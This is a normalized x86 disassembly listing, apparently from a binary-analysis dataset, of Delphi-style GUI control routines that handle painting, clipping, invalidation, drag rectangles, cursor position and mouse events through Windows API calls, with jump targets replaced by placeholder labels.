je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_444154
mov eax esi
call sub_444154
jmp r-xdata
sub_4471f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41b6b0
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41b544
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41b6d0
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4473cc
mov eax ebx
call sub_45ddc4
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_40358c
sub_447274
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_4471f4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_4471f4
jmp r-xdata
sub_447298
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44732e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447335
lea eax [ ebp - 0xc ]
call sub_404120
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
sub_447340
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41b6b0
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_41b654
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_446924
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4473cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_446924
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d7a4
push eax
call InvalidateRect
push ebp
call sub_447340
pop ecx
test al al
je r-xdata
mov al 0x1
sub_447468
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_45dd9c
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_448138
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40358c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4474cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d7a4
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4475a5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44b578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d7a4
push eax
call ReleaseDC
retn
sub_44762c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax edi
call sub_44816c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_446ac8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406f00
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_448138
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4452d4
sub_447700
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44773c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_447788
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4477b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_446f28
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_446f14
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402b60
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402b60
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_44d7a4
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_447898
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4478e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_40358c
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_40358c
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4479a8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_4479f4
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_447a40
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447b5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_42763c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b62
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_447b94
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_446ac8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40358c
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_40358c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40358c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_40358c
jmp r-xdata
sub_447c84
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_419ff0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44816c
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_446f14
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_446f28
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_41a040
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_447e64
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_446a9c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_40358c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_44d7a4
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444698
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_447e4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_44d7a4
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_44d7a4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403390
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_446924
test esi esi
je r-xdata
sub_447e64
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_40358c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_448ce8
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40358c
mov eax esi
call sub_4469cc
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_446988
mov ecx eax
xor edx edx
xor eax eax
call sub_41a018
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40358c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_447f08
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_447f38
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_447fa4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_448064
sub_447fd4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_448004
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_446ac8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448030
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_448064
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_448138
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44816c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_448204
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_45dd9c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_45dd9c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
